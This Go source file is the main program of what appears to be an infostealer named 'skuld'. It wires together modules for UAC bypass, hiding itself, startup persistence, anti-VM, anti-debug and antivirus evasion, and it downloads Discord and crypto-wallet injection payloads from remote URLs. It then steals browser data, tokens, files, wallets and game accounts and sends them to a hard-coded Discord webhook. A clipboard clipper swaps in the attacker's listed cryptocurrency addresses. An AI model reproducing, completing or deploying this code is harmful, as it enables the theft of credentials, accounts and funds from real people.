package main

import (
	"github.com/hackirby/skuld/modules/antidebug"
	"github.com/hackirby/skuld/modules/antivm"
	"github.com/hackirby/skuld/modules/antivirus"
	"github.com/hackirby/skuld/modules/browsers"
	"github.com/hackirby/skuld/modules/clipper"
	"github.com/hackirby/skuld/modules/commonfiles"
	"github.com/hackirby/skuld/modules/discodes"
	"github.com/hackirby/skuld/modules/discordinjection"
	"github.com/hackirby/skuld/modules/fakeerror"
	"github.com/hackirby/skuld/modules/games"
	"github.com/hackirby/skuld/modules/hideconsole"
	"github.com/hackirby/skuld/modules/startup"
	"github.com/hackirby/skuld/modules/system"
	"github.com/hackirby/skuld/modules/tokens"
	"github.com/hackirby/skuld/modules/uacbypass"
	"github.com/hackirby/skuld/modules/wallets"
	"github.com/hackirby/skuld/modules/walletsinjection"
	"github.com/hackirby/skuld/utils/program"
)

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "https://discord.com/api/webhooks/1404262220283777084/HcXgJ4ICZsS-yjTaM_AQuCKl-GxoxJZBcGucKRqK6wxpE4oAAfYQYQ-d8hcgPrgIimYR",
		"cryptos": map[string]string{
			"BTC": "bc1qdvmgkdve7shhduz9tclwsrq2rpwzwhj48c98x3",
			"BCH": "qzc02j2gxzxcerv0mwdshrch7t25al3c0sk880n8rf",
			"ETH": "0xec470C277c8B18D6124e65F5920329Aadd643B88",
			"XMR": "",
			"LTC": "LYDgVKX7iWRaSDuD25D7pmFX2uYmZVFDM9",
			"XCH": "",
			"XLM": "GCBFNHXCFVZTS6AZALKTZGUI64PZGPFTGIXKDZROB2JVZYSDDKKP3K7X",
			"TRX": "TUKnXrzBuYiRe3vyoMFEzKSk1vtZ48F54G",
			"ADA": "addr1qxpdudc5v80c8mzync6umhgjst3aa3w35xqca9h73pe0rpvzmcm3gcwls0kyf834ehw39qhrmmzargvp36t0azrj7xzsfyqkcn",
			"DASH": "XtdoFwXLMRKnSWNh2RhL1iSgdtQo3u5Git",
			"DOGE": "D5J7Efw1SikEuzQ65NioYaucbfSADg6NNQ",
		},
	}

	if program.IsAlreadyRunning() {
		return
	}

	uacbypass.Run()

	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
	}

	antivm.Run()
	go antidebug.Run()
	go antivirus.Run()

	go discordinjection.Run(
		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
		CONFIG["webhook"].(string),
	)
	go walletsinjection.Run(
		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
		CONFIG["webhook"].(string),
	)

	actions := []func(string){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
	}

	for _, action := range actions {
		go action(CONFIG["webhook"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
